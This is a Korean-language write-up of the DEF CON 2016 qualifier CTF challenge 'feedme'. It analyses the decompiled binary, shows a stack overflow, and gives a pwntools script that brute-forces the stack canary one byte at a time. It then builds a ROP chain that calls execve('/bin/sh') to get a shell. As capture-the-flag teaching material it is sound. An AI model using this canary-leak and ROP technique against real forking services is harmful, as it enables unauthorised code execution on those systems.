---
title: "Baby's First) feedme"
sidebar_position: 1
---
## **Information**

### **Description**
```
Don't forget to feed me <http://www.scs.stanford.edu/brop/>

<http://download.quals.shallweplayaga.me/47aa9b0d8ad186754acd4bece3d6a177/feedme>

[feedme\_47aa9b0d8ad186754acd4bece3d6a177.quals.shallweplayaga.me:4092](http://download.quals.shallweplayaga.me/47aa9b0d8ad186754acd4bece3d6a177/feedme)
```

### **File**
* [feedme](/attachments/327948/327949.bin)

### **Source Code**
* <https://github.com/legitbs/quals-2016/tree/master/feedme>

## **Writeup**

### File information
```sh title="File information"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ file feedme 
feedme: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ checksec.sh --file feedme 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   feedme
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

### **Binary analysis**

#### **Main(0x0804917A)**

* 해당 함수는 다음과 같은 기능을 합니다.
  + signal()함수를 이용해 SIGALRM을 설정합니다.
  + 150초 후에 sigAlarm()함수가 호출되어, 해당 프로그램이 종료됩니다.
  + Feedme()함수를 호출합니다.

```c title="Main(0x0804917A)"
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signal(14, sigAlarm);
  alarm(150u);
  _IO_setvbuf(off_80EA4C0, 0, 2, 0);
  _IO_new_fclose(off_80EA4BC);
  Service();
  return 0;
}
```

#### **Service(0x080490B0)**

* 해당 함수는 다음과 같은 기능을 합니다.
  + fork()함수를 이용해 자식 프로세스를 생성합니다.
  + 자식 프로세스가 정상적으로 생성되면 Feedme()함수를 실행합니다.
  + Feedme() 함수가 종료되면 waitpid() 함수를 이용해 자식 프로세스가 종료될 때까지 대기합니다.
    - 리턴된 값을 이용해 정상적으로 종료되었는지 확인합니다.
  + 이러한 과정을 for()를 이용해 800번의 반복합니다.

```c title="Service(0x080490B0)"
void Service()
{
  unsigned __int8 v0; // al@3
  int v1; // [esp+0h] [ebp-28h]@0
  const char **v2; // [esp+4h] [ebp-24h]@0
  const char **v3; // [esp+8h] [ebp-20h]@0
  char *argv; // [esp+10h] [ebp-18h]@1
  unsigned int i; // [esp+14h] [ebp-14h]@1
  const struct timespec *childPid; // [esp+18h] [ebp-10h]@2
  int waitPid; // [esp+1Ch] [ebp-Ch]@4

  argv = 0;
  for ( i = 0; i <= 799; ++i )
  {
    childPid = fork();
    if ( !childPid )
    {
      v0 = Feedme(v1, v2, v3);
      printf_0("YUM, got %d bytes!\n", v0);
      return;
    }
    waitPid = __waitpid(childPid, &argv, 0);
    if ( waitPid == -1 )
    {
      printf((int)"Wait error!");
      exit(-1);
    }
    if ( argv == (char *)-1 )
    {
      printf((int)"Child IO error!");
      exit(-1);
    }
    printf((int)"Child exit.");
    _IO_fflush(0);
  }
}
```

#### **FeedMe(0x8049036)**

* 해당 함수는 다음과 같은 기능을 합니다.
  + UserInputNum() 함수를 이용해 숫자 값을 리턴 받습니다.
  + UserInputStr() 함수를 이용해 사용자로 부터 문자열을 입력 받습니다.
    - 입력받은 문자열은 buf에 저장됩니다.
  + converter() 함수를 이용해 값을 변환 후 리턴 합니다.
    - Int 값을 Hex 값으로 변환합니다.
* 해당 함수에서 중요한 부분은 buf, canary 변수 입니다.
  + buf의 크기는 32 byte 입니다.
  + buf 다음에 canary가 선언되어 있습니다.
  + 즉, StackOverflow가 발생하게되면 Canary 값을 확인할 수 있습니다.

```c title="FeedMe(0x8049036)"
int __cdecl FeedMe(int argc, const char **argv, const char **envp)
{
  unsigned __int8 number; // ST1B_1@1
  char *str; // eax@1
  int result; // eax@1
  int v6; // edx@1
  char buf; // [esp+1Ch] [ebp-2Ch]@1
  int canary; // [esp+3Ch] [ebp-Ch]@1

  canary = *MK_FP(__GS__, 20);
  printf((int)"FEED ME!");
  number = UserInputNum();
  UserInputStr((int)&buf, number);
  str = converter(&buf, number, 16u);
  printf_0("ATE %s\n", str);
  result = number;
  v6 = *MK_FP(__GS__, 20) ^ canary;
  return result;
}
```

#### **UserInputNum(0x8048E42)**
* 해당 함수는 다음과 같은 기능을 합니다.
  + read()함수를 이용하여 사용자로 부터 한개의 문자만 입력받습니다.
    - 입력 받은 문자는 int형으로 저장됩니다.
    - 예를 들면 'A'를 입력했을 경우 해당 프로그램은 숫자 '65'로 사용됩니다.
  + 입력받은 값은 return 합니다.

```c title="UserInputNum(0x8048E42)"
int UserInputNum()
{
  unsigned __int8 number; // [esp+1Bh] [ebp-Dh]@1
  int len; // [esp+1Ch] [ebp-Ch]@1

  len = __libc_read(0, &number, 1);
  if ( len != 1 )
    exit(-1);
  return number;
}
```

#### **UserInputStr(0x8048E7E)**
* 해당 함수는 다음과 같은 기능을 합니다.
  + read() 함수를 이용해 사용자로 부터 문자열을 입력받습니다.
  + 입력받은 문자열은 buf + location 에 저장됩니다.
* 취약성은 여기서 발생합니다.
  + buf는 FeedMe() 함수에서 선언한 char형 변수 입니다.
  + UserInputStr()함수는 FeedMe() 함수로 부터 buf의 주소를 전달받아 사용합니다.
  + buf의 크기는 32byte입니다.
  + size의 값은 UserInputNum() 함수를 이용해 32보다 큰 값을 저장할 수 있습니다.
  + 즉, Stack Overflow가 발생하게 됩니다.
  + 그리고 이 취약성을 이용해 해당 바이너리에 적용된 Canary의 값도 추출할 수 있습니다.

```c title="UserInputStr(0x8048E7E)"
int __cdecl UserInputStr(int buf, int number)
{
  int result; // eax@1
  int size; // [esp+14h] [ebp-14h]@1
  int location; // [esp+18h] [ebp-10h]@1
  int len; // [esp+1Ch] [ebp-Ch]@2

  result = number;
  size = number;
  location = 0;
  while ( size )
  {
    len = __libc_read(0, location + buf, size);
    if ( len <= 0 )
      exit(-1);
    location += len;
    result = len;
    size -= len;
  }
  return result;
}
```

### Debuging

#### **Debugging child processes**

* 해당 프로그램에서 FeedMe() 함수를 자식 프로세스에서 호출합니다.

```c title="Service(0x080490B0)"
void Service()
{
...
    childPid = fork();
    if ( !childPid )
    {
      v0 = Feedme(v1, v2, v3);
      printf_0("YUM, got %d bytes!\n", v0);
      return;
    }
...
}
```

* GDB를 이용해 자식 프로세스를 Debuging하기 위해서는 다음과 같은 설정이 필요합니다.

```sh title="GDB settings"
(gdb) set follow-fork-mode child 
(gdb) show follow-fork-mode 
Debugger response to a program call of fork or vfork is "child".
(gdb)
```

#### **Check for Stack Overflow**

* 다음과 같이 Break point를 설정합니다.

```sh title="Break point"
(gdb) b *0x08049069
Breakpoint 1 at 0x8049063(UserInputStr)
(gdb) b *0x0804906E
Breakpoint 2 at 0x804906e
```

* Stack Overflow를 확인하기 위해 첫번째 입력 값으로 '$' 를 입력합니다.
  + '$'는 Dec로 36을 나타냅니다.
* 두번째 입력 값으로 문자 'A' 32개와 'B' 3개를 입력합니다.
  + 문자 'A'는 buf공간을 채워줍니다.
    - buf 영역 : 0xffffd26c ~ 0xffffd28c
  + 문자 'B'는 Canary공간을 덮어씁니다.
    - canary 영역 : 0xffffd28c
  + - Value : 0x080490dc
* 해당 값을 입력 하면 다음과 같은 Error가 발생합니다.
  + 해당 에러는 canary의 값이 변경되어 발생하는 것입니다.
  + 아래 코드에 의해 canary의 값이 변경된것을 확인합니다.
  - "v6 = \*MK\_FP(\_\_GS\_\_, 20) ^ canary;"
* 즉, Canary 값만 Leak 할 수 있으면 return addresss를 덮어쓸수 있습니다.

```sh title="Check for Stack Overflow"
(gdb) r
Starting program: /home/lazenca0x0/Documents/DEFCON 2016/feedme 
[New process 10798]
FEED ME!
$
[Switching to process 10798]

Breakpoint 1, 0x08049069 in ?? ()
(gdb) 
(gdb) x/wx $esp
0xffffd250:	0xffffd26c
(gdb) x/20wx 0xffffd26c
0xffffd26c:	0x00000000	0x00002710	0x00000000	0x00000000
0xffffd27c:	0x00000000	0x080ea0a0	0x00000000	0x00000000
0xffffd28c:	0xfad83800	0x00000000	0x080ea00c	0xffffd2c8
0xffffd29c:	0x080490dc	0x080ea0a0	0x00000000	0x080ed840
0xffffd2ac:	0x0804f8b4	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB

Breakpoint 2, 0x0804906e in ?? ()
(gdb) x/20wx 0xffffd26c
0xffffd26c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd27c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd28c:	0x0a424242	0x00000000	0x080ea00c	0xffffd2c8
0xffffd29c:	0x080490dc	0x080ea0a0	0x00000000	0x080ed840
0xffffd2ac:	0x0804f8b4	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
ATE 41414141414141414141414141414141...
*** stack smashing detected ***: /home/lazenca0x0/Documents/DEFCON 2016/feedme terminated

Program received signal SIGABRT, Aborted.
0xf7ffdc90 in __kernel_vsyscall ()
(gdb)
```

### Canary Leak

* 앞에서 확인한 StackOverflow 취약성을 이용해 Canary 값을 추출할 수 있습니다.
* 한번 생성된 Canary는 프로그램이 종료되기 전까지 변경되지 않기 때문에 가능합니다.
* 다음과 같은 코드를 이용해 Canary 값을 확인할 수 있습니다.
  + 1byte씩 Canary 값을 추출합니다.
    - Canary의 크기는 4바이트 입니다.
  + 1byte에 입력되는 값의 범위는 0x00 ~ 0xff입니다.

```python title="Canary Leak"
from pwn import *

p = process('./feedme')
p.recvline()

canary = ""
while len(canary) < 4:
        for i in xrange(256):
                buf = "A" * 32 + canary + chr(i)
                p.send(chr(len(buf)) + buf)
                data = p.recvuntil("FEED ME!")
                if "YUM" in data:
                        canary += chr(i)
                        print "[+] canary: %r" % chr(i)
                        break

log.info("CANARY : " + canary.encode("hex"))
```

### Structure of Exploit code
```
1. read()함수를 이용하여 사용자로 부터 값을 입력 받고, WRITE권한이 있는 공간에 사용자 입력값을 저장합니다.
2. execve()함수를 이용하여 사용자가 입력한 값을 실행하도록 합니다.
```
* The following information is required for an attack:
```
* 사용자 입력값을 저장할 메모리 공간
* shellcode 작성
* ROP gadget
```
### **Information for attack**

#### **ROP design**

* 해당 프로그램의 취약점을 통해 Shell을 획득하기 위해 다음과 같은 코드를 사용할 예정입니다.

  + UserInputStr()를 이용해 사용자로 부터 문자열("/bin/sh\n")을 입력받아 지정된 주소에 저장합니다.
  + execve()함수의 첫번째 인자로 문자열이 저장된 주소를 전달합니다.

```python title="ROP design"
sub_8048E7E("사용자 입력 값을 저장할 메모리 주소",10)
execve("사용자 입력 값을 저장할 메모리 주소",0,0)
```

#### **사용자 입력값을 저장할 메모리 공간**

* 사용자 입력값을 저장할 메모리 공간이 필요합니다.
* readelf를 이용하여 해당 파일의 "Section Headers" 정보를 확인합니다.
  + Write권한이 있는 .bss영역, .data영역, 등등을 사용할 수 있습니다.

```sh title="readelf -S feedme"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ readelf -S feedme 
There are 27 section headers, starting at offset 0xa20a0:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .note.ABI-tag     NOTE            080480f4 0000f4 000020 00   A  0   0  4
  [ 2] .rel.plt          REL             08048138 000138 000070 08   A  0   4  4
  [ 3] .init             PROGBITS        080481a8 0001a8 000023 00  AX  0   0  4
  [ 4] .plt              PROGBITS        080481d0 0001d0 0000e0 00  AX  0   0 16
  [ 5] .text             PROGBITS        080482b0 0002b0 0758c4 00  AX  0   0 16
  [ 6] __libc_freeres_fn PROGBITS        080bdb80 075b80 000ac6 00  AX  0   0 16
  [ 7] __libc_thread_fre PROGBITS        080be650 076650 00006f 00  AX  0   0 16
  [ 8] .fini             PROGBITS        080be6c0 0766c0 000014 00  AX  0   0  4
  [ 9] .rodata           PROGBITS        080be6e0 0766e0 01bff0 00   A  0   0 32
  [10] __libc_subfreeres PROGBITS        080da6d0 0926d0 00002c 00   A  0   0  4
  [11] __libc_atexit     PROGBITS        080da6fc 0926fc 000004 00   A  0   0  4
  [12] __libc_thread_sub PROGBITS        080da700 092700 000004 00   A  0   0  4
  [13] .eh_frame         PROGBITS        080da704 092704 00e2f0 00   A  0   0  4
  [14] .gcc_except_table PROGBITS        080e89f4 0a09f4 0000c2 00   A  0   0  1
  [15] .tdata            PROGBITS        080e9f40 0a0f40 000010 00 WAT  0   0  4
  [16] .tbss             NOBITS          080e9f50 0a0f50 000018 00 WAT  0   0  4
  [17] .init_array       INIT_ARRAY      080e9f50 0a0f50 000008 00  WA  0   0  4
  [18] .fini_array       FINI_ARRAY      080e9f58 0a0f58 000008 00  WA  0   0  4
  [19] .jcr              PROGBITS        080e9f60 0a0f60 000004 00  WA  0   0  4
  [20] .data.rel.ro      PROGBITS        080e9f80 0a0f80 000070 00  WA  0   0 32
  [21] .got              PROGBITS        080e9ff0 0a0ff0 000008 04  WA  0   0  4
  [22] .got.plt          PROGBITS        080ea000 0a1000 000044 04  WA  0   0  4
  [23] .data             PROGBITS        080ea060 0a1060 000f20 00  WA  0   0 32
  [24] .bss              NOBITS          080eaf80 0a1f80 00180c 00  WA  0   0 32
  [25] __libc_freeres_pt NOBITS          080ec78c 0a1f80 000018 00  WA  0   0  4
  [26] .shstrtab         STRTAB          00000000 0a1f80 000120 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

* 해당 바이너리를 실행 후, 메모리 맵을 보면 다음과 같은 정보를 알 수 있습니다.
  + 해당 바이너리에서 Write권한 설정되어 있는 메모리 영역은 "0x080e9000-0x080eb000" 입니다.
  + Section header 정보와 비교해 보면 "0x080e9000" ~ "0x080e9f40" 영역까지는 빈공간입니다.
  + 빈공간이라고 판단할수 있는 이유는 다음과 같습니다.
    - .gcc\_except\_table은 0x080e89f4 부터 C2만큼의 공간을 사용하고 있습니다.
      * 0x080e89f4 + 0xc2 = 0x80e8ab6
    - .tdata 영역은 0x080e9f40부터 시작합니다.
      * 0x080e9f40 - 0x80e8ab6 = 0x148a
* 0x080e9000 영역에 사용자 입력 값을 저장하겠습니다.

```sh title="cat /proc/{PID}/maps"
(gdb) shell cat /proc/2627/maps
08048000-080e9000 r-xp 00000000 08:01 703612     /home/lazenca0x0/Documents/DEFCON2016/feedme/feedme
080e9000-080eb000 rw-p 000a0000 08:01 703612     /home/lazenca0x0/Documents/DEFCON2016/feedme/feedme
080eb000-0810f000 rw-p 00000000 00:00 0          [heap]
b7ffc000-b7ffe000 r--p 00000000 00:00 0          [vvar]
b7ffe000-b8000000 r-xp 00000000 00:00 0          [vdso]
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
(gdb)
```

#### **ROP gadget - UserInputStr(system call)**

* UserInputStr() 함수의 호출방식은 system call 형태로 호출됩니다.
* 그렇기 때문에 인자 값을 전달하기 위해 "pop esi ; pop edi ; ret ;" Gadget이 필요합니다.
* 다음과 같은 방법으로 Gadget을 찾을 수 있습니다.

  + 사용할 주소는 0x0809e11c 입니다.

```sh title="ROP Gadget - UserInputStr(system call)"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 2 |grep "pop esi ; pop edi ; ret "
0x0804846e: pop esi ; pop edi ; ret  ;  (1 found)

...

lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

#### **ROP gadget - execve(int 0x80, interrupt 0x80)**

* execve() 함수의 경우 "int 0x80" 명령어를 이용해 호출하기 때문에 사용되는 레지스터가 다릅니다.
  + 인자을 전달하기 위해 "pop eax", "pop ebx", "pop ecx", "pop edx" 명려어가 포함된 Gadget이 필요합니다.
  + 하지만 해당 명령어를 모두 포함하고 있는 Gadget은 해당 바이너리에 존재하지 않습니다.

```sh title="ROP Gadget - pop eax ; pop ebx ; pop ecx ; pop edx ;"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 5 |grep "pop eax ; pop ebx ; pop ecx ; pop edx ;"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

* 다음과 같이 execve call number를 저장할 수 있는 Gadget도 찾을 수 있습니다.

```sh title="ROP Gadget - pop eax ; ret"
lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$ ./rp-lin-x86 -f ./feedme -r 1 |grep "pop eax ; ret  ;"
0x080bb496: pop eax ; ret  ;  (1 found)
0x080e243d: pop eax ; ret  ;  (1 found)
0x080e433a: pop eax ; ret  ;  (1 found)
0x080e6a5c: pop eax ; ret  ;  (1 found)
lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$
```

* 다음과 같이 인자 값을 전달할 수 있는 Gadget도 찾을 수 있습니다.

```sh title="ROP Gadget - pop edx ; pop ecx ; pop ebx ; ret"
lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$ ./rp-lin-x86 -f ./feedme -r 3 |grep "pop edx ; pop ecx ; pop ebx ; ret  ;"
0x0806f370: pop edx ; pop ecx ; pop ebx ; ret  ;  (1 found)
lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$
```

* 그리고 execve 함수의 실행하기 위해 "int 0x80" Gadget이 필요합니다.

```sh title="ROP Gadget - 'int 0x80'"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 0 |grep "int 0x80"
0x08049761: int 0x80 ;  (1 found)

...
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

* 앞에서 확인한 정보를 이용하여 ROP 작성하면 다음과 같이 작성할 수 있습니다.

```python title="ROP Chain"
#sub_8048E7E("사용자 입력 값을 저장할 메모리 주소",10)
payload += p32(0x08048E7E)	# 0x08048E7E
payload += p32(0x0804846e)	# POP esi ; POP edi ; ret;
payload += p32(0x080e9000)	# Arg1 : 0x080e9000
payload += p32(10)			# Arg2 : 10
#execve("사용자 입력 값을 저장할 메모리 주소",0,0)
payload += p32(0x0806f370)	# POP edx ; POP ecx ; POP ebx ; ret ;
payload += p32(0)
payload += p32(0)
payload += p32(0x080e9000)	# Arg1 : 0x080e9000
#rax = 11, int 0x80
payload += p32(0x080bb496)	# POP eax ; ret ;
payload += p32(11)			# execve call number
payload += p32(0x08049761)	# int 0x80;
```

#### **확인 내용 정리**

```txt title="공격에 사용될 정보"
* 사용자 입력값을 저장할 메모리 공간 : 0x080e9000
* ROP gadget
  * "pop esi ; pop edi ; ret ;" : 0x0804846e
  * "pop edx ; pop ecx ; pop ebx ; ret ;" : 0x0806f370
  * "pop eax ; ret ;" : 0x080bb496
  * "int 0x80 ;" : 0x08049761
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

p = process('./feedme')

p.recvline()

canary = ""
while len(canary) < 4:
        for i in xrange(256):
                buf = "A" * 32 + canary + chr(i)
                p.send(chr(len(buf)) + buf)
                data = p.recvuntil("FEED ME!")
                if "YUM" in data:
                        canary += chr(i)
                        print "[+] canary: %r" % chr(i)
                        break

log.info("CANARY : " + canary.encode("hex"))

p.recv()
payload = "A"*32
payload += canary
payload += "A"*12
payload += p32(0x08048E7E)
payload += p32(0x0804846e)
payload += p32(0x080e9000)
payload += p32(10)
payload += p32(0x0806f370)
payload += p32(0)
payload += p32(0)
payload += p32(0x080e9000)
payload += p32(0x080bb496)
payload += p32(11)
payload += p32(0x08049761)

log.info("Payload len : " + chr(len(payload)))
log.info("Payload Hex : " + payload.encode("hex"))
log.info("Payload Str : " + payload)

p.send(chr(len(payload)))
p.send(payload)
p.recv()
p.send("/bin/sh\0")
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag |  |

## **Related Site**

* <http://rootfoo.org/ctf/2016-legitbs-ctf-quals-feedme>
* <http://blukat29.github.io/2016/05/defcon-2016-quals-feedme/>
* <http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html>